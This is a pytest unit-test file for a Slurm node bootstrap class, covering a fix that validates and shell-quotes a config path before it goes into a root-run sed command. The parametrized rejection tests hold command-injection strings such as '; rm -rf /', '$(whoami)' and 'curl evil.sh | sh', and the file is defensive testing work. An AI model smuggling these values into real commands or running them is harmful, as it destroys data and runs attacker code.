"""Unit tests for SlurmNodeBootstrap.

Covers open-resource-broker-2706.5: generate_user_data interpolated an
unvalidated slurm_conf_path into a root-run cloud-init `sed -i` command — a
command-injection risk if a caller ever passed an untrusted path. The path is
now validated against an allowlist and additionally shell-quoted before
interpolation.
"""

import subprocess

import pytest

from orb.infrastructure.scheduler.slurm.node_bootstrap import SlurmNodeBootstrap


@pytest.fixture
def bootstrap() -> SlurmNodeBootstrap:
    return SlurmNodeBootstrap(scontrol_path="scontrol", timeout=5)


def _completed(
    returncode: int = 0, stdout: str = "", stderr: str = ""
) -> subprocess.CompletedProcess:
    return subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr=stderr)


# ---------------------------------------------------------------------------
# generate_user_data — slurm_conf_path validation (the security fix)
# ---------------------------------------------------------------------------


def test_generate_user_data_accepts_default_conf_path():
    script = SlurmNodeBootstrap.generate_user_data("compute-001", "ctld.example.com")

    assert "/etc/slurm/slurm.conf" in script
    assert "hostnamectl set-hostname compute-001" in script


def test_generate_user_data_accepts_custom_clean_absolute_path():
    script = SlurmNodeBootstrap.generate_user_data(
        "compute-001", "ctld.example.com", slurm_conf_path="/opt/slurm/etc/slurm.conf"
    )

    assert "/opt/slurm/etc/slurm.conf" in script


@pytest.mark.parametrize(
    "malicious_path",
    [
        "/etc/slurm/slurm.conf; rm -rf /",
        "/etc/slurm/slurm.conf`whoami`",
        "/etc/slurm/slurm.conf$(whoami)",
        "/etc/slurm/slurm.conf && curl evil.sh | sh",
        "/etc/slurm/../../etc/passwd",
        "relative/path/slurm.conf",
        "",
        "/etc/slurm/slurm conf with spaces.conf",
        "/etc/slurm/slurm.conf\nrm -rf /",
    ],
)
def test_generate_user_data_rejects_malicious_or_malformed_paths(malicious_path):
    with pytest.raises(ValueError, match="Invalid slurm_conf_path"):
        SlurmNodeBootstrap.generate_user_data(
            "compute-001", "ctld.example.com", slurm_conf_path=malicious_path
        )


def test_generate_user_data_passes_conf_path_through_shlex_quote():
    """The allowlist's safe charset is a subset of shlex's "needs no quoting"
    set, so shlex.quote is a no-op here — but it's exercised defensively in
    case the allowlist is ever loosened to admit characters shlex would quote."""
    import shlex

    script = SlurmNodeBootstrap.generate_user_data(
        "compute-001", "ctld.example.com", slurm_conf_path="/etc/slurm/slurm.conf"
    )

    expected_sed = (
        f"sed -i 's/^SlurmctldHost=.*/SlurmctldHost=ctld.example.com/' "
        f"{shlex.quote('/etc/slurm/slurm.conf')}"
    )
    assert expected_sed in script


def test_generate_user_data_rejects_invalid_node_name():
    with pytest.raises(ValueError, match="Invalid node name"):
        SlurmNodeBootstrap.generate_user_data("node; rm -rf /", "ctld.example.com")


def test_generate_user_data_rejects_invalid_slurmctld_host():
    with pytest.raises(ValueError, match="Invalid slurmctld host"):
        SlurmNodeBootstrap.generate_user_data("compute-001", "ctld; rm -rf /")


def test_generate_user_data_allows_fqdn_slurmctld_host():
    script = SlurmNodeBootstrap.generate_user_data("compute-001", "slurmctld.cluster.internal")

    assert "SlurmctldHost=slurmctld.cluster.internal" in script


# ---------------------------------------------------------------------------
# register_node_address
# ---------------------------------------------------------------------------


def test_register_node_address_success(bootstrap, monkeypatch):
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: _completed(returncode=0))

    assert bootstrap.register_node_address("compute-001", "10.0.0.5") is True


def test_register_node_address_includes_hostname_when_given(bootstrap, monkeypatch):
    captured = {}

    def _fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return _completed(returncode=0)

    monkeypatch.setattr(subprocess, "run", _fake_run)
    bootstrap.register_node_address("compute-001", "10.0.0.5", hostname="compute-001-host")

    assert "NodeHostname=compute-001-host" in captured["cmd"]


def test_register_node_address_failure_returns_false(bootstrap, monkeypatch):
    monkeypatch.setattr(
        subprocess, "run", lambda *a, **k: _completed(returncode=1, stderr="scontrol error")
    )

    assert bootstrap.register_node_address("compute-001", "10.0.0.5") is False


def test_register_node_address_timeout_returns_false(bootstrap, monkeypatch):
    def _raise(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=["scontrol"], timeout=5)

    monkeypatch.setattr(subprocess, "run", _raise)

    assert bootstrap.register_node_address("compute-001", "10.0.0.5") is False


def test_register_node_address_binary_not_found_returns_false(bootstrap, monkeypatch):
    def _raise(*args, **kwargs):
        raise FileNotFoundError("scontrol not found")

    monkeypatch.setattr(subprocess, "run", _raise)

    assert bootstrap.register_node_address("compute-001", "10.0.0.5") is False


def test_register_node_address_rejects_invalid_node_name(bootstrap):
    with pytest.raises(ValueError, match="Invalid node name"):
        bootstrap.register_node_address("node; rm -rf /", "10.0.0.5")


def test_register_node_address_rejects_invalid_ip(bootstrap):
    with pytest.raises(ValueError, match="Invalid IP address"):
        bootstrap.register_node_address("compute-001", "not-an-ip")


def test_register_node_address_rejects_invalid_hostname(bootstrap):
    with pytest.raises(ValueError, match="Invalid node name"):
        bootstrap.register_node_address("compute-001", "10.0.0.5", hostname="bad; host")
